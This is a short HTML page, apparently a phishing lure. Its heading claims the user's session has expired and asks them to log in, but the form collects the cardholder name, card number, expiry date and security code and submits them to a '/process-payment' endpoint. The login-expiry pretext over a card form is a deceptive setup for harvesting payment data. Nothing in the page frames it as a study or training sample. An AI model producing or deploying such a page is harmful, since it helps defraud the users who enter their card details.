<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        input { display: block; margin-bottom: 10px; width: 100%; padding: 8px; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
    </style>
</head>
<body>
    <h3>Session Expired - Please Login</h3>
    <form action="/process-payment" method="POST">
  <label for="cc-name">Name on Card</label>
  <input type="text" id="cc-name" name="ccname" autocomplete="cc-name" required>

  <label for="cc-number">Card Number</label>
  <input type="text" id="cc-number" name="cardnumber" autocomplete="cc-number" inputmode="numeric" required>

  <label for="cc-exp">Expiry Date</label>
  <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required>

  <label for="cc-csc">Security Code</label>
  <input type="text" id="cc-csc" name="csc" autocomplete="cc-csc" inputmode="numeric" required>

  <button type="submit">Pay Now</button>
</form>

</body>
</html>
